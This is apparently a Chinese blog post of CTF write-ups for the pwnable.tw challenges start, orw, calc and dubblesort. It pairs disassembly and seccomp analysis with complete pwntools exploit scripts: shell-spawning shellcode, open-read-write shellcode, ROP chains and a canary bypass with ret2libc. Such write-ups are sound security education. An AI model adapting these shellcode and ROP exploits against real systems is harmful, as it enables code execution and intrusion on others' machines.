---
title: pwnable.tw练习
abbrlink: 4968
date: 2018-12-01 17:50:59
tags:
---

# start

```
push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
```

方法一:

通过栈溢出控制eip指向0x08048087，从而泄露栈的地址，再次输入shellcode,控制eip指向shellcode即可。

```
from pwn import *

#debug = int(raw_input("debug?:"))
debug = 0
if debug:
    p = process("./start")
    context.log_level = "debug"
else:
    p = remote("chall.pwnable.tw", 10000)

"""
ebx
ecx
edx
eax
int 0x80
"""
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

#attach(p, "b *0x08048097")
p.recvuntil("CTF:")
p.sendline("a" * 0x14 + p32(0x08048087))

shell_addr = u32(p.recvn(4)) + 0x14
print hex(shell_addr)
# 由于某些原因，栈的地址和泄露出来的地址偏移不固定，通过 \x90，可以扩大eip指向shellcode的几率。
p.sendline("a" * 0x14 + p32(shell_addr) + "\x90" * 10 + shellcode)

p.interactive()
```

方法二:

1. 通过控制eip到0x804808b,泄露栈的地址
2. 为了解除shellcode的长度限制，需要首先修改dl寄存器的值，扩大dl的值
3. 由于dl的值已经扩大，pwntools自带的shellcode也能读进去，但此时esp和读入的地址重合，首先需要修改esp的值，最终getshell

```
import sys
from pwn import *
context(os='linux', arch='i386', log_level='debug')

GDB = 1
if len(sys.argv) > 2:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process("./start")

def main():
    if GDB:
        raw_input()
    payload = p32(0x804808b) # write
    p.recvuntil('CTF:')
    payload = payload.rjust(0x14 + 4, '\x00')
    p.send(payload)

    raw_input()

    leak = u32(p.recv(0x18 + 4)[-4:]) # b0
    shellcode1_addr = leak - (0xa0 - 0xb8)
    shellcode2_addr = leak - (0x310 - 0x33c + 4) + 8
    shellcode = asm(
        '''
        mov dl, 0xff
        ret
        '''
    )

    payload = ""
    payload = payload.ljust(0x30 - 0x04, '\x90')
    assert len(payload) == 0x30 - 0x04
    payload += p32(shellcode1_addr)
    payload += p32(0x8048095)
    payload += shellcode
    p.send(payload)

    payload = ""
    payload = payload.ljust(0xf5c - 0xf14, '\x00')
    payload += p32(shellcode2_addr)
    payload += asm("""
        sub esp, 0x100
    """)
    payload += asm(shellcraft.sh())
    p.send(payload)
    raw_input()
    p.interactive()

if __name__ == "__main__":
    main()
```

# orw

重要参考链接: https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/

参考链接: https://aryb1n.github.io/2017/10/15/pwnable-tw-orw/

该程序启用了seccomp,可以通过三种方法查看:

```
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h]
  char *v2; // [esp+8h] [ebp-80h]
  char v3; // [esp+Ch] [ebp-7Ch]
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(&v3, &unk_8048640, 0x60u);
  v1 = 12;
  v2 = &v3;
  prctl(0x26, 1, 0, 0, 0);
  prctl(0x16, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

首先看一下prctl方法:

> 除了用prctl也可以用prctl的system call来进入这个模式
>
> 这句话不太理解，以后再看。

prctl第一个参数是option, 每个数字代表的含义在`/usr/include/linux/prctl.h`里可以找到, 这个[网站](http://man7.org/linux/man-pages/man2/prctl.2.html)有参考

```
#define PR_SET_NO_NEW_PRIVS    38
#define PR_SET_SECCOMP    22
```

下面这个启用了seccomp沙盒模式, 第二个参数说明了沙盒类型`seccomp_mode_filter`相当于是设置了函数白名单, 具体filter了哪些函数, 看第三个参数, 第三个参数是个`struct sock_fprog`。

再看看允许的函数吧:

方法一: 使用seccomp-tools，方便快捷:

```
qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

可以看到，系统仅允许使用`rt_sigreturn`,`sigreturn`,`exit_group`,`exit`,`open`,`read`,`write`。

方法二: 把从v3(offset = 0x640 ~ 0x6a0)这里开始的96字节数据dump下来, 然后看看是啥…

```
dd if=orw of=orw_fprog bs=1 skip=1600 count=96
```

对照结构体查看:

```
struct sock_fprog       /* Required for SO_ATTACH_FILTER. */
{
        unsigned short          len;    /* Number of filter blocks */
        struct sock_filter      *filter;
};

struct sock_filter      /* Filter block */
{
        __u16   code;   /* Actual filter code */
        __u8    jt;     /* Jump true */
        __u8    jf;     /* Jump false */
        __u32   k;      /* Generic multiuse field */
};
```

len就是12, 有12个block…每个8字节, 正好96字节, 我们看看sock_filter的内容,找资料说`libpcap`里有一个`bpf_image`函数可以那个把结构体解释成人类可解读的.

首先安装：`apt-get install libpcap-dev`

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
int main() {
    FILE * fp = fopen("./orw_fprog", "r");
    char buf1[100];
    char buf2[1000];
    struct bpf_insn aa[12];
    fread(buf1, 1, 96, fp);
    memcpy(aa, buf1, 96);
    int i;
    for(i = 0; i < 12; i++) {
        printf("%s\n", bpf_image(&aa[i], i));
    }

    return 0;
}
// gcc -o unpack unpack.c -lpcap
```

```
(000) ld       [4]
(001) jeq      #0x40000003      jt 2    jf 11
(002) ld       [0]
(003) jeq      #0xad            jt 11    jf 4
(004) jeq      #0x77            jt 11    jf 5
(005) jeq      #0xfc            jt 11    jf 6
(006) jeq      #0x1             jt 11    jf 7
(007) jeq      #0x5             jt 11    jf 8
(008) jeq      #0x3             jt 11    jf 9
(009) jeq      #0x4             jt 11    jf 10
(010) ret      #327718
(011) ret      #2147418112
```

* code是汇编指令
* jt是指令结果为true的跳转
* jf是指令结果为false的跳转
* k是指令的参数

可以看出，允许的调用号为: 0xad,0x77,0xfc,0x1,0x5,0x3,0x4,也就是上边对应的7个函数。

```
#define __NR_exit 1
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
```

方法三:  参考链接: https://blog.csdn.net/qq_29343201/article/details/78109066

目前采用的方法是IDApython脚本dump数据下来，然后输入scmp_bpf_disasm。IDApython的文档非常诡异，函数没有说明，函数的参数也不能直接看出来，所以搜了很长时间找了一个别人的。。

```
import idaapi
start_address = 0x8048640
data_length = 0x80486a0 - start_address
data = idaapi.get_many_bytes(start_address, data_length)
fp = open('C:\Users\HT\Desktop\orw.bpf', 'wb')
print(data)
fp.write(data)
fp.close()
print("done")
```

然后直接重定向至scmp_bpf_disasm：

这软件也不知道怎么装的，哎，先算了。

伪代码:

```
char *file="/home/orw/flag"
sys_open(file,0,0)
sys_read(3,file,0x30)
sys_write(1,file,0x30)
```

exp1:

```
from pwn import *

p = remote("chall.pwnable.tw", 10001)

# read -> open -> read -> write
shellcode = '''
mov eax, 0x03
xor ebx, ebx
mov ecx, esp
mov edx, 0x10
int 0x80

mov eax, 0x05
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80

mov ebx, eax 
mov eax, 0x03
mov ecx, esp
mov edx, 0x30
int 0x80

mov eax, 0x04
mov ebx, 1
mov ecx, esp
mov edx, 0x30
int 0x80
'''

shellcode = asm(shellcode)
p.recvuntil(":")
p.send(shellcode)

raw_input()
p.send("/home/orw/flag")
p.interactive()
```

exp2:

HITCON-Training:

```
shellcode = sc.pushstr("/home/m4x/HITCON-Training/LAB/lab2/testFlag")
shellcode += sc.open("esp")
#  open返回的文件文件描述符存贮在eax寄存器里 
shellcode += sc.read("eax", "esp", 0x100)
#  open读取的内容放在栈顶 
shellcode += sc.write(1, "esp", 0x100)
```



```
#-*- coding:utf8
from pwn import *

# context.log_level = 'debug'
context(arch='i386', os='linux')

io = remote("chall.pwnable.tw", 10001)
io.recvuntil("shellcode:")
shellcode = ''
shellcode += shellcraft.open("/home/orw/flag")
shellcode += shellcraft.read("eax", "esp", 100) 
shellcode += shellcraft.write(1, 'esp', 100)
io.send(asm(shellcode))
print io.interactive()
```

exp3:

```
#coding:utf-8
from pwn  import *

file_name="./orw"
context(log_level = 'debug', arch = 'i386', os = 'linux')
#p=process(file_name)#本地
p=remote('chall.pwnable.tw',10001)#远程
#shellcode=asm(shellcraft.sh())
shellcode=""
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
#open(file,0,0)
shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
#read(3,file,0x30)
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
#write(1,file,0x30)
def pwn():
    recv = p.recvuntil(':')
    p.sendline(shellcode)
    flag = p.recv(100)
    print flag
pwn()
```

exp4:

```
import sys
from pwn import *
from keystone import *
context(os='linux', arch='i386', log_level='debug')

GDB = 1
if len(sys.argv) > 2:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process("./orw")

def main():
    if GDB:
        raw_input()
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    shellcode = """
    mov eax, 3
    xor ebx, ebx
    mov ecx, 0x0804a000
    mov edx, 0x10
    int 0x80

    mov eax, 5
    mov ebx, 0x804a000
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov eax, 3
    mov ecx, 0x804a000
    mov edx, 0x40
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, 0x804a000
    mov edx, 0x40
    int 0x80
    """
    try:
        encoding, count = ks.asm(shellcode)
        print('count {}'.format(count))
    except KsError as e:
        print("Error: {}".format(e))
    p.recvuntil('shellcode:')
    p.send(''.join(map(chr, encoding)))

    raw_input()
    p.send('/home/orw/flag\x00')

    p.interactive()

if __name__ == "__main__":
    main()
```

# calc

32位:

```
eax=11
ebx=“/bin/sh”字符串的地址
ecx=0
edx=0
int 0x80
```

64位:

```
rax=0x3b
rdi="/bin/sh"字符串地址
rsi=0
rdx=0
syscall
```

示例: http://eternalsakura13.com/2018/04/27/star_primepwn/

首先定义一个struct:

![](/assets/pwnabletw/TIM截图20181203173044.png)

然后倒入数据结构：

![](/assets/pwnabletw/TIM截图20181203173225.png)

逻辑漏洞:当输入表达式第一位就是符号的时候，就会修改buff->buff_size, 由于buf->buff_size可以被控制，所以执行eval的时候，会造成任意地址写。

![](/assets/pwnabletw/TIM截图20181203173256.png)

## rop不需要leak

```
from pwn import *

debug = int(raw_input("debug?:"))

if debug:
    p = process("./calc")
    context.log_level = "debug"
else:
    p = remote("chall.pwnable.tw", 10100)


def get_val(value):
    value = int(value)
    if value < 0:
        return value & 0xffffffff
    else:
        return value

current_val = {}

def write(addr, content):
    p.sendline("+" + str(addr))
    current_val = get_val(p.recvline()[:-1])
    p.info('current {} = {}'.format(addr, hex(current_val)))
    
    payload = "+" + str(addr)
    val = content - current_val
    if addr == 363:
        print val
    if val < 0:
        payload += '-' + str(abs(val))
    elif val > 0x7fffffff:
        payload += '-' + str(0xffffffff - val + 1)
    else:
        payload += '+' + str(val)
    p.sendline(payload)
    received = get_val(p.recvline()[:-1])
    if received != content:
        p.info('not right!')
        raise Exception('not successful')

# 361 ret_addr 
p.recvuntil("===\n")

rop = [
  0x080701aa, # pop edx ; ret
  0x080ec060, # @ .data
  0x0805c34b, # pop eax ; ret
  u32('/bin'),
  0x0809b30d, # mov dword ptr [edx], eax ; ret
  0x080701aa, # pop edx ; ret
  0x080ec064, # @ .data + 4
  0x0805c34b, # pop eax ; ret
  u32('/sh\x00'),
  0x0809b30d, # mov dword ptr [edx], eax ; ret
  0x080701aa, # pop edx ; ret
  0x080ec068, # @ .data + 8                    # edx = 0
  0x080550d0, # xor eax, eax ; ret
  0x0809b30d, # mov dword ptr [edx], eax ; ret # @.data+8 = 0 
  0x080701d1, # pop ecx ; pop ebx ; ret        # ecx = 0, ebx= '/bin/sh' address
  0x080ec068, # @ .data + 8
  0x080ec060, # @ .data
  0x0805c34b, # pop eax ; ret            # eax = 0xb
  0xb,
  0x08049a21 # int 0x80
]

index = 361
for i in rop:
    write(index, i)
    index += 1

p.sendline("end")
p.interactive()
```

## rop需要leak

```
from pwn import *

debug = int(raw_input("debug?:"))

if debug:
    p = process("./calc")
    context.log_level = "debug"
else:
    p = remote("chall.pwnable.tw", 10100)


def get_val(value):
    value = int(value)
    if value < 0:
        return value & 0xffffffff
    else:
        return value

current_val = {}

def write(addr, content):
    p.sendline("+" + str(addr))
    current_val = get_val(p.recvline()[:-1])
    p.info('current {} = {}'.format(addr, hex(current_val)))
    
    payload = "+" + str(addr)
    val = content - current_val
    if addr == 363:
        print val
    if val < 0:
        payload += '-' + str(abs(val))
    elif val > 0x7fffffff:
        payload += '-' + str(0xffffffff - val + 1)
    else:
        payload += '+' + str(val)
    p.sendline(payload)
    received = get_val(p.recvline()[:-1])
    if received != content:
        p.info('not right!')
        raise Exception('not successful')

# 360 ebp
# 361 ret_addr 
p.recvuntil("===\n")

#leak stack
p.sendline("+360")
stack_leak = get_val(p.recvline()[:-1])
start_pos = stack_leak - 0x20
p.info('current {} = {}'.format(360, hex(start_pos)))

# +361 -> return_address
# stack:
# 360 => start_pos(leaked)
# 361 => 0x080701d1 : pop ecx ; pop ebx ; ret
# 362 => 0
# 363 => ebx : start_pos + 36
# 364 => 0x0805c34b : pop eax ; ret
# 365 => eax : 0xb
# 366 => 0x080701aa : pop edx ; ret
# 367 => 0
# 368 => 0x08049a21 : int 0x80
# 369 => 0x6e69622f /bin/sh\x00
# 370 => 0x68732f

write(361, 0x080701d1)
#write(362, start_pos + 36)
write(362, 0)
write(363, start_pos + 36)
write(364, 0x0805c34b)
write(365, 0xb)
write(366, 0x080701aa)
write(367, 0x0)
write(368, 0x08049a21)
write(369, 0x6e69622f)
write(370, 0x68732f)

p.sendline("end")
p.interactive()
```

# dubblesort

## note1. 本题核心在于`scanf`函数:

```
do
    {
      __printf_chk(1, (int)"Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);                 // 输入无符号整形数据，如果输入f,那么scanf输入失败，原栈上对应位置数据没有改变
      ++v5;
      number_copy = number;
      ++v4;
    }
    while ( number > v5 );
```

由于`scanf`对应`%u`,也就是输入无符号整形数据，那么如果输入非[0-9]，`scanf`输入失败，对应位置的数据没有改变，所以可以在`canary`处，输入`+`或其他字母，来绕过`canary`检查，从而进行栈溢出。

同时需要注意的是，在进行栈溢出操作的时候，直接输入10进制整数即可，`scanf`会自动将10进制数转化为16进制，保存在栈上。

## note2. 关于vmmap的问题：

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x56555000 0x56556000 r-xp     1000 0      /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
0x56556000 0x56557000 r--p     1000 0      /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
0x56557000 0x56558000 rw-p     1000 1000   /home/qianfa/Desktop/pwn/pwnabletw/dubblesort_dir/dubblesort
0xf7e02000 0xf7e03000 rw-p     1000 0      
0xf7e03000 0xf7fb3000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb5000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb5000 0xf7fb6000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb6000 0xf7fb9000 rw-p     3000 0      
0xf7fd4000 0xf7fd5000 rw-p     1000 0      
0xf7fd5000 0xf7fd8000 r--p     3000 0      [vvar]
0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]
0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]

```

如上所示，其中对应libc的三行:

```
0xf7e03000 0xf7fb3000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb5000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb5000 0xf7fb6000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
```

第一行就是libc的加载起始地址，第3行对应libc的`.got.plt`的起始地址。

```
[30] .dynamic          DYNAMIC         001b1db0 1b0db0 0000f0 08  WA  5   0  4
[31] .got              PROGBITS        001b1ea0 1b0ea0 000150 04  WA  0   0  4
[32] .got.plt          PROGBITS        001b2000 1b1000 000030 04  WA  0   0  4
[33] .data             PROGBITS        001b2040 1b1040 000e94 00  WA  0   0 32
[34] .bss              NOBITS          001b2ee0 1b1ed4 002b3c 00  WA  0   0 32
```

可以看到本地libc.so的`.got.plt`的偏移地址就是`0x1b2000`，而本题中的`.got.plt`偏移地址是`0x1b0000`：

```
  [29] .dynamic          DYNAMIC         001afdb0 1aedb0 0000f0 08  WA  5   0  4
  [30] .got              PROGBITS        001afea0 1aeea0 000150 04  WA  0   0  4
  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4
  [32] .data             PROGBITS        001b0040 1af040 000e94 00  WA  0   0 32
```

## note3: 排序问题

由于所有输入最终会进行排序，为了保证canary位置的值不被改变，从canary之后的值都应该大于canary处存放的值:

## note4: exploit:

```
from pwn import *

debug = int(raw_input("debug?:"))

if debug:
    p = process("./dubblesort")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    context.log_level = "debug"
    libc_off = 0x1b2000
else:
    p = remote("chall.pwnable.tw", 10101)
    libc = ELF("./libc_32.so.6")
    context.log_level = "debug"
    libc_off = 0x1b0000

p.recvuntil("name :")
p.sendline("aaaa" * 6)
p.recvuntil("aa\n")
libc.address = u32("\x00" + p.recvn(3)) - libc_off
print "libc.address" + hex(libc.address)

p.recvuntil("sort :")
p.sendline("35")
for i in range(24):
    p.recvuntil(" :")
    p.sendline("0")

p.recvuntil(" :")
p.sendline("+")

sys_addr = libc.symbols['system']
bin_sh = next(libc.search("/bin/sh"))
print "sys" + str(sys_addr)
print "bin" + str(bin_sh)

for i in range(7):
    p.recvuntil(" :")
    p.sendline(str(sys_addr))

p.recvuntil(" :")
p.sendline(str(sys_addr))
p.recvuntil(":")
p.sendline(str(sys_addr))
p.recvuntil(" :")
p.sendline(str(bin_sh))
p.interactive()
```



